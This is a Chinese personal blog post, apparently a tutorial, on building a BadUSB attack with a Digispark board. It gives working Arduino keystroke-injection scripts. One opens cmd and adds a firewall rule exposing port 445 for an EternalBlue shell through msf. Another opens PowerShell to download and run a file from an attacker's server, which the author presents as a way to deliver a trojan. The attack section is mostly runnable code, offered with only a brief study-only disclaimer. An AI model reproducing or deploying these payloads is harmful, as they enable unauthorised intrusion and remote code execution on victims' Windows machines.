@@ -1,0 +1,866 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/static/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/static/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Lzy-wi">
+  <meta name="keywords" content="">
+  <title>badusb的学习记录&amp;入侵windows主机 - Lzywi&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Lzywi'Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/static/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-06-12 00:35" pubdate>
+        2018年6月12日 凌晨
+      </time>
+    </span>
+  
+</div>
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      字数统计:1.5k 字
+    </span>
+  
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      阅读时长:
+      19
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">badusb的学习记录&amp;入侵windows主机</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>&emsp;&emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大<br><a id="more"></a></p>
+<h4 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h4><p><img src="/img/2018-06-12/badusb.png" srcset="/img/static/loading.gif" alt="badusb"><br>&emsp;&emsp;灯灯灯凳，这个就是我们的主角啦<br>&emsp;&emsp;对于第一次玩硬件的小伙伴，硬件入门不难，但是要有耐心，很多时候是需要不断的去调试代码，查找资料，所以一定要有耐心。</p>
+<h5 id="一、U盘的结构"><a href="#一、U盘的结构" class="headerlink" title="一、U盘的结构"></a>一、U盘的结构</h5><p>&emsp;&emsp;要想理解badusb攻击的方法就要先了解U盘的结构，U盘的主要结构如下<br><pre><code class="hljs undefined">|<span class="hljs-string">--------</span>|<span class="hljs-string">---------------</span>|
+|<span class="hljs-string">  固件  </span>|<span class="hljs-string">   数据存储区   </span>|
+|<span class="hljs-string">--------</span>|<span class="hljs-string">---------------</span>|</code></pre></p>
+<p> &emsp;&emsp;U盘由芯片控制器和闪存两部分组成（也间接说明为什么U盘的额空间总是不够写的那么大），芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。</p>
+<h5 id="usb协议"><a href="#usb协议" class="headerlink" title="usb协议"></a>usb协议</h5><p>&emsp;&emsp;现在很多设备都是用usb接口，摄像头、U盘、鼠标、键盘，无线键鼠的接收器，等等，为了兼容这么多设备，设计USB协议标准的时候就没有要求每个USB设备向网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备多个输入输出设备的特征。<br>&emsp;&emsp;问题就是在这里，当你插进一个U盘时电脑并没有鉴别你的U盘到是不是真的U盘，这样我们就有机可乘了<br><img src="/img/2018-06-12/xixixi.png" srcset="/img/static/loading.gif" alt="xixixi"></p>
+<h5 id="入侵原理"><a href="#入侵原理" class="headerlink" title="入侵原理"></a>入侵原理</h5><p>正常的U盘插到电脑里的大概流程是下面这样的<br><pre><code class="hljs undefined">           <span class="hljs-comment">电脑识别为U盘的固件</span>
+<span class="hljs-comment">固件信息</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt;<span class="hljs-comment">U盘</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt;<span class="hljs-comment">读取U盘的内容</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt;<span class="hljs-comment">示U盘的内容</span></code></pre></p>
+<p>构造badusb的固件让电脑识别为键盘<br><pre><code class="hljs undefined">           电脑识别为键盘的固件
+固件信息<span class="hljs-comment">--------------------------&gt;键盘</span></code></pre></p>
+<p>再构造里面的内容<br><pre><code class="hljs undefined"><span class="hljs-comment">键盘</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt;<span class="hljs-comment">模拟人敲命令</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt;<span class="hljs-comment">根据写好的脚本敲命令</span></code></pre></p>
+<h5 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h5><p>&emsp;&emsp;材料清单</p>
+<ul>
+<li>Digispark（也就是我们的主角）</li>
+<li>Arduino（编写以及把脚本写到badusb里的程序）</li>
+<li>脚本</li>
+</ul>
+<h4 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h4><h5 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h5><p>驱动下载地址，链接：<a href="http://pan.baidu.com/s/1i4K10dn" target="_blank" rel="noopener">http://pan.baidu.com/s/1i4K10dn</a> 密码：ilaf<br><pre><code class="hljs undefined">下载好后运行<span class="hljs-code">`DPinst64.exe`</span>，32位系统点击<span class="hljs-code">`DPinst.exe`</span>,一路回车等待安装完成
+下载编写程序的开发软件[<span class="hljs-string">https://www.arduino.cc/en/Main/Software</span>](<span class="hljs-link">https://www.arduino.cc/en/Main/Software</span>)
+运行Arduino，在首选项中添加开发板网址[<span class="hljs-string">http://digistump.com/package_digistump_index.json</span>](<span class="hljs-link">http://digistump.com/package_digistump_index.json</span>)(不同的板网址不同)</code></pre></p>
+<p><img src="/img/2018-06-12/1.png" srcset="/img/static/loading.gif" alt="1"><br>在工具–&gt;开发板–&gt;开发板管理器里，下载这个驱动,等待下载完成即可<br><img src="/img/2018-06-12/2.png" srcset="/img/static/loading.gif" alt="2"><br><pre><code class="hljs undefined">选择<span class="hljs-keyword">Digispark开发板
+</span>编译器选择USBtinyISP</code></pre></p>
+<p><img src="/img/2018-06-12/3.png" srcset="/img/static/loading.gif" alt="3"><br><img src="/img/2018-06-12/4.png" srcset="/img/static/loading.gif" alt="4"><br>到这里所有准备就做好了<br><img src="/img/2018-06-12/xixixi.png" srcset="/img/static/loading.gif" alt="xixixi"></p>
+<h5 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h5><p>先看一眼商家给的教程<br><img src="/img/2018-06-12/jiaocheng.png" srcset="/img/static/loading.gif" alt="jiaocheng"><br><img src="/img/2018-06-12/emmm.jpg" srcset="/img/static/loading.gif" alt="emmm..."><br>在我的印象中应该是写一个木马进固件然后一插进电脑就黑进去的啊[捂脸][捂脸][捂脸]<br>算了，先一步一步跟着教程摸索下<br>最终代码如下，修改了一点点<br><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"DigiKeyboard.h"</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_ESC     41</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_BACKSPACE 42</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_TAB     43</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_PRT_SCR 70</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_DELETE  76</span>
+
+<span class="hljs-keyword">void</span> <span class="hljs-built_in">setup</span>() &#123;
+
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);
+DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);
+DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"cmd"</span>));
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"echo"</span>));
+DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>,MOD_SHIFT_LEFT);
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">" "</span>));
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"Team233"</span>));
+DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>,MOD_SHIFT_LEFT);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+
+&#125;
+
+
+<span class="hljs-keyword">void</span> <span class="hljs-built_in">loop</span>() &#123;
+
+&#125;</code></pre></p>
+<p>编译…没问题,上传…O98k<br><img src="/img/2018-06-12/7.png" srcset="/img/static/loading.gif" alt="7"><br>激动人心的时候到了，重新插进电脑去,10秒后…<br><img src="/img/2018-06-12/final.png" srcset="/img/static/loading.gif" alt="final"><br><img src="/img/2018-06-12/6.png" srcset="/img/static/loading.gif" alt="6"><br>到目前为止就算badusb就算做好了</p>
+<h4 id="进阶教程"><a href="#进阶教程" class="headerlink" title="进阶教程"></a>进阶教程</h4><p>上面只是简单的尝试，接下来要进行更高级的用法<br><img src="/img/2018-06-12/1.gif" srcset="/img/static/loading.gif" alt="gif"><br>然鹅。。。。。<br><img src="/img/2018-06-12/8.png" srcset="/img/static/loading.gif" alt="8"><br><img src="/img/2018-06-12/9.jpg" srcset="/img/static/loading.gif" alt="9"><br>只有这么点容量怎么写马，而且商家没说，网上也找不到，怎么写。。。。。<br>忽然想起当时买这个的时候有好多个版本。。。<br>我绝对不会告诉你我是因为它<b><del>比较便宜</del></b>体积小迷你好看才买它的<br>经过我一番沉思与实践之后<br>如果目标是win7系统，我们可以利用终端打开445端口，然后使用永恒之蓝漏洞直接getshell<br>如果目标是win10，我们可以从我们搭好的服务器下载木马饭后执行木马程序，对win7也同样适用<br>cmd开启445端口命令如下<br><pre><code class="hljs undefined">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">"open 445"</span> <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">localport</span>=445</code></pre></p>
+<p>编写好的脚本代码如下<br><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"DigiKeyboard.h"</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_ESC     41</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_BACKSPACE 42</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_TAB     43</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_PRT_SCR 70</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_DELETE  76</span>
+
+<span class="hljs-keyword">void</span> <span class="hljs-built_in">setup</span>() &#123;
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);
+DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);
+DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"cmd"</span>));
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"netsh advfirewall firewall add rule name="</span>)); 
+DigiKeyboard.<span class="hljs-built_in">print</span>(<span class="hljs-keyword">char</span>(<span class="hljs-number">34</span>)); 
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"open445"</span>)); 
+DigiKeyboard.<span class="hljs-built_in">print</span>(<span class="hljs-keyword">char</span>(<span class="hljs-number">34</span>)); 
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">" dir=in protocol=tcp localport=445 action=allow"</span>));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+&#125;
+
+
+<span class="hljs-keyword">void</span> <span class="hljs-built_in">loop</span>() &#123;
+
+&#125;</code></pre></p>
+<p>在kali下nmap可以看到445端口已经打开,msf直接漏洞利用就可以实现getshell<br><img src="/img/2018-06-12/445.png" srcset="/img/static/loading.gif" alt="445"><br>win10系统下载测试文件Team233.png的脚本代码如下<br><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"DigiKeyboard.h"</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_ESC     41</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_BACKSPACE 42</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_TAB     43</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_PRT_SCR 70</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_DELETE  76</span>
+
+<span class="hljs-keyword">void</span> <span class="hljs-built_in">setup</span>() &#123;
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);
+DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);
+DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>,MOD_GUI_LEFT);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"pow"</span>));
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>,MOD_SHIFT_LEFT);
+DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"$client = new-object System.Net.WebClient"</span>));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">" $client.DownloadFile('http://192.168.1.2/Team233.png', '."</span>)); 
+DigiKeyboard.<span class="hljs-built_in">print</span>(<span class="hljs-keyword">char</span>(<span class="hljs-number">92</span>)); 
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"Team233.png')"</span>));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"."</span>));
+DigiKeyboard.<span class="hljs-built_in">print</span>(<span class="hljs-keyword">char</span>(<span class="hljs-number">92</span>)); 
+DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"Team233.png"</span>));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+&#125;
+
+
+<span class="hljs-keyword">void</span> <span class="hljs-built_in">loop</span>() &#123;
+
+&#125;</code></pre></p>
+<p>效果就参考我录的视频吧<br>链接: <a href="https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ</a> 密码: c9he<br><b>未经允许不得传播</b><br><b>本文仅供学习之用，不负任何法律责任<b></b></b></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/硬件安全/">硬件安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/badusb/">badusb</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/07/20/sqli-labs1/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sqli-labs的学习记录一（1-8）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/05/22/writeup1/">
+                        <span class="hidden-mobile">RCTF部分wirteup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz",
+          app_key: "i3vUWkHRRkiiS7LuUpuIm1E5",
+          placeholder: "说些什么",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "sRx9dQVqzL65gdhuYexJtTPF",
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" rel="nofollow noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    
+  <div class="statistics">
+    
+    
+    <i class="iconfont icon-users"></i>
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      <i class="iconfont icon-friends"></i>
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+    
+      
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-codeforces"></i>
+        全站共计:31.9k 字
+      </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer>
+  (function () {
+    // 查询存储的记录
+    function getRecord(Counter, target) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({target})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {target, time: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    }
+
+    // 发起自增请求
+    function increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    }
+
+    // 构建自增请求体
+    function buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "time": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    }
+
+    // 校验是否为有效的 UV
+    function validUV() {
+      var key = 'LeanCloud_UV_Flag';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    }
+
+    function addCount(Counter) {
+      var enableIncr = 'true' === 'true' && window.location.hostname !== 'localhost';
+      var getterArr = [];
+      var incrArr = [];
+
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#leancloud-site-pv-container');
+      if (pvCtn || enableIncr) {
+        var pvGetter = getRecord(Counter, 'site-pv').then((record) => {
+          incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-pv');
+          if (ele) {
+            ele.innerText = record.time + 1;
+            if (pvCtn) {
+              pvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#leancloud-site-uv-container');
+      if (uvCtn || enableIncr) {
+        var uvGetter = getRecord(Counter, 'site-uv').then((record) => {
+          var vuv = validUV();
+          vuv && incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-uv');
+          if (ele) {
+            ele.innerText = record.time + (vuv ? 1 : 0);
+            if (uvCtn) {
+              uvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 如果是文章，请求文章的浏览数，并自增
+      if ('true' === 'true') {
+        var viewCtn = document.querySelector('#leancloud-post-views-container');
+        if (viewCtn || enableIncr) {
+          var target = decodeURI('/2018/06/12/badusb/');
+          var viewGetter = getRecord(Counter, target).then((record) => {
+            incrArr.push(buildIncrement(record.objectId))
+            if (viewCtn) {
+              var ele = document.querySelector('#leancloud-post-views');
+              if (ele) {
+                ele.innerText = (record.time || 0) + 1;
+                viewCtn.style.display = 'inline';
+              }
+            }
+          });
+          getterArr.push(viewGetter);
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && increment(Counter, incrArr);
+        })
+      }
+    }
+
